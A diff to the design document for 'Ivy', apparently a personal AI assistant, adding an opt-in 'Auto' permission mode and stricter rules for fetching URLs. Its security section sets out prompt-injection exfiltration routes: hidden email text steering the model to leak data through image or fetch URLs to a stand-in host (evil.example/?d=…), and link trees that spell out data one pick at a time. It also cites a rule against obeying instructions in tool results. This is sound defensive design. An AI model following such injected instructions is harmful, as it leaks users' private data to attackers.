@@ -221,7 +221,10 @@ deny  = ["shell__*"]
 - **Plugin defaults:** a tool may set `defaultAllow: true` (low-impact tools such as memory saves; not allowed on `dangerous` tools); user `deny` and `ask` rules still win.
 - "For this session" choices belong to their session: a new session starts with none, and they last while the process that holds them runs (they aren't saved).
 - A prompt no one answers is refused after a while, and the model is told no one answered rather than that the user said no.
-- **Permission modes (later):** a session-wide switch that resolves "ask" by risk level. M5 needs one (unattended jobs: writes run, external actions wait for the user, dangerous ones are denied), which is why the four risk levels stay distinct.
+- **Permission modes:** how an "ask" is resolved, which is why the four risk levels stay distinct.
+  - **Ask** (the default): as above.
+  - **Auto** (M3, chosen by the user in the settings): a classifier model (the helper model, §5.2) decides whether a `write` or `external` call is one the user asked for, and asks when it can't tell or fails. It sees only what the user wrote and the call, never tool results or other outside content, so text injected there has no say in it. Models resist injection better each year, and many would trade some safety for not being asked; the choice is theirs. It is a convenience, not a boundary: `deny` and `ask` rules hold, `dangerous` tools are still asked (a command in the sandbox, from M4, may run, its worst bounded, §8.3), and a call it let through shows as such in the transcript.
+  - **Unattended** (M5 jobs): writes run, external actions wait for the user, dangerous ones are denied.
 
 ### 5.6 Plugin Host
 
@@ -353,8 +356,8 @@ A plugin is a folder with an `index.ts` that default-exports an `IvyPlugin`. The
 - Tool *results* from outside sources (emails, web pages, RSS) are untrusted data. The built-in `rules.md` tells the model not to follow instructions found inside them, and `write`/`external` tools ask unless the user allowed them, `dangerous` ones every time, which limits prompt-injection damage.
 - **What the window loads can leak too, without a tool.** Text hidden in an email can tell the model to put what it knows into an image's URL (`![](https://evil.example/x.png?d=…)`); a page that loads a reply's images sends it with no one seeing, past every permission prompt. Reported against ChatGPT, Claude.ai and Copilot. So a reply's images wait for a click (§5.7). It is not a full defense: a click made without reading the site still sends the URL, and so does opening a link, which carries the same risk. What would do more, and why not now:
   - **Only URLs already in the conversation load** (ChatGPT's way): a URL the model builds can't be among them, as the data wasn't known when they were written. It needs every tool marked for whether its results are outside content: what Ivy wrote and read back (memory, a file) must not count, or a URL saved by a tool and read back passes. And it still leaks a little: an injection can list a URL per letter and have the model pick, so a cap on how many load is needed too.
-  - **A model judging each URL** would read the same injected text as the one it checks, and is right only most of the time; the boundary has to be a rule, not a judgment.
-- **`fetch` (M4) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the conversation already had (the user's messages, search results, a page fetched before), which can't hold what the model read since; one the model built is asked about, the whole URL shown, with *always* for its site. Its results are outside content (§8.1).
+  - **A model judging each URL** would read the same injected text as the one it checks, and is right only most of the time; the boundary has to be a rule, not a judgment. (Auto mode's classifier, §5.5, is a convenience the user chooses on top of the rules, and reads none of that text.)
+- **`fetch` (M4) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the user wrote or a search returned, which can't hold what the model read since; any other is asked about, the whole URL shown, links in a page it fetched included: a page is the attacker's to write, and a tree of links on it, followed one pick at a time, spells out the data (found in Anthropic's server-side `web_fetch` in 2026, which let them through). A cap on fetches per turn bounds what a run of picks the user allows can carry. Its results are outside content (§8.1).
 
 ### 6.4 Reusing other ecosystems
 
@@ -406,7 +409,7 @@ The data root is `$IVY_HOME`, default `~/.ivy`, in development too, so the termi
 | `coding-agent` | M3 | Optional delegate for coding tasks to any coding CLI that speaks the Agent Client Protocol (Claude Code and Codex through adapters, Gemini CLI natively), run as a subagent. The agent's own permission requests go through Ivy's gate. Optional: Ivy's `fs` and `shell` stay the baseline (principle 7) | `run` |
 | `mcp` bridge | M3 | Wraps configured MCP servers as plugins | (from servers) |
 | `gmail` / `calendar` | M4 | Triage, summarize, draft replies, today's agenda — via MCP servers or Google APIs | `search`, `read_thread`, `draft`, `agenda` |
-| `web` | M4 | Web search & fetch (Anthropic server tools on Anthropic's API; otherwise a client-side tool); a URL is fetched unasked only if the conversation already had it (§6.3) | `search`, `fetch` |
+| `web` | M4 | Web search: the model's own server-side search where its vendor's API is known to have it (Anthropic's now, OpenAI's with the Responses type, others as needed, told by `base_url`, as one silently ignored would leave the model searching nothing), and only then no `search` tool of Ivy's; a search API elsewhere. Fetch is always Ivy's own: a server-side one would skip the permission gate. A URL is fetched unasked only if the user wrote it or a search returned it (§6.3); what either brings is outside content | `search`, `fetch` |
 | `digest` | M5 | Scheduled brief from RSS / GitHub / email / calendar | job `morning-brief` |
 
 ### 8.1 Memory plugin
@@ -679,6 +682,7 @@ Goal: Ivy runs in the background and can reach the user, so a reminder comes on 
 
 ### M3 — Work helper
 - The `fs` and `shell` plugins (§8.3), the baseline for work and coding on any model; the shell asks before every command. Coding CLIs as optional delegates over ACP.
+- The Auto permission mode, for those who choose it (§5.5).
 - Skills (§8.2) and the MCP bridge (tools exposed on demand, not all up front).
 - Background tasks, subagents and steering (§5.9).
 - Evals: more cases (tools, work tasks) and replays of recorded sessions without an API key; the runner and the memory, journal and basics sets exist since M1.
@@ -753,3 +757,4 @@ Real forks in the road only; the sections hold the details. Superseded decisions
 | 2026-10-21 | OpenAI's Chat Completions beside the Messages API; Ivy's format stays Anthropic's, translated at the edge; `type` says the protocol, `base_url` only what is a vendor's alone (§5.2.1) | Between the two nearly every model is reachable; sessions and the loop stay as they are, where a multi-provider library would replace them |
 | 2026-10-21 | Images from the user: uploaded as files when attached, then beside their session, named by hash and kept with it; sent whole, shrunk by the page only past the APIs' limits; a model that refuses them learned like an optional feature | A session file stays readable; the pictures last as long as the conversation; no second model and no retry loop to keep |
 | 2026-10-21 | A reply's images load on a click, as on Claude.ai, not unseen, not never (Gemini), not by an allow-list of URLs seen in the conversation (ChatGPT) | Nothing leaks unseen, at one click; an allow-list needs every tool marked for whether it brings outside content, and no tool brings any yet (§6.3) |
+| 2026-10-21 | An Auto permission mode, the user's choice: a classifier that sees only what the user wrote decides what they asked for; Ask stays the default | Models resist injection better each year, and many would trade some safety for not being asked; keeping tool results from the classifier keeps injected text out of the decision, and the rules and the sandbox remain the boundary |
